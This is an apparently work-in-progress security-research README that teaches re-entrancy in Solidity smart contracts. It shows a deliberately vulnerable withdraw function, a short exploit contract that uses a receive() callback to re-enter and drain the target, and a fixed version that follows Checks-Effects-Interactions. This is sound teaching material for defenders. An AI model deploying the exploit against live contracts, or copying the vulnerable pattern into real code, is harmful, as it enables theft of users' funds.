# 🚧 WORK IN PROGRESS 🚧

# Security research

This repo aims to cover the most common security vulnerabilities in EVM smart contracts,
and provides a set of tools to help developers to find and fix them.
Vulnerabilities are categorized by their type, each type has an example of a vulnerable contract,
a fixed contract (proof) and an exploit to verify the vulnerability.

- [Re-entrancy](#reentrancy-attack)
- [Withdrawal Pattern](#withdrawal-pattern)

## ReEntrancy Attack

[Git Source](https://github.com/Dom-Mac/solspace/blob/f5838bdc64c22456cef26721eb6148f05fc8f839/src/ReEntrancy)

A re-entrancy attack can happen when the **Checks-Effects-Interactions** pattern is not
respected during contracts development.

- **Check**: Validate parameters before modifying the state

- **Effects**: Change the state

- **Interactions**: Call other contracts after storage has been updated accordingly

Every time an interaction is made, the cycle starts again.

### Vulnerable withdraw

[Git Source](https://github.com/Dom-Mac/solspace/blob/f5838bdc64c22456cef26721eb6148f05fc8f839/src/ReEntrancy/ReEntrancyVulnerable.sol)

```solidity
/**
 * @dev Function to withdraw your deposited funds **vulnerable - do not use**
 */
function withdraw() public {
  /**
   * @dev The interaction is made BEFORE the state update
   *      **wrong**
   */
  (bool success, ) = msg.sender.call{ value: balances[msg.sender] }('');

  /**
   * @dev Update the state
   *      **wrong**
   */
  if (success) balances[msg.sender] = 0;
}
```

### ReEntrancy Exploit

[Git Source](https://github.com/Dom-Mac/solspace/blob/f5838bdc64c22456cef26721eb6148f05fc8f839/src/ReEntrancy/ReEntrancyExploit.sol)

Contract to exploit the vulnerable contract, it can be used to drain the contract balance.
The receive function, fired on plain Ether transfers, is used to trigger the re-entrancy attack.

```solidity
/**
 * @dev Function to attack target contract
 */
function exploit() external payable {
  require(msg.value >= 1 ether);
  target.deposit{ value: 1 ether }();
  target.withdraw();
}

/**
 * @dev Function executed on plain Ether transfers
 */
receive() external payable {
  if (address(target).balance >= 1 ether) {
    target.withdraw();
  }
}
```

### Fixed withdraw

[Git Source](https://github.com/Dom-Mac/solspace/blob/f5838bdc64c22456cef26721eb6148f05fc8f839/src/ReEntrancy/ReEntrancyProof.sol)

This contract is free from re-entrancy attacks

```solidity
/**
 * @dev Function to withdraw your deposited funds
 */
function withdraw() public {
  /**
   * @dev Update the state
   */
  uint256 amount = balances[msg.sender];
  balances[msg.sender] = 0;

  /**
   * @dev The interaction is made AFTER the state update
   */
  (bool success, ) = msg.sender.call{ value: amount }('');

  /**
   * @dev Check if the interaction was successful
   */
  require(success, 'Transfer failed.');
}
```

## Withdrawal Pattern

## Installation

```bash
forge install
forge test
```
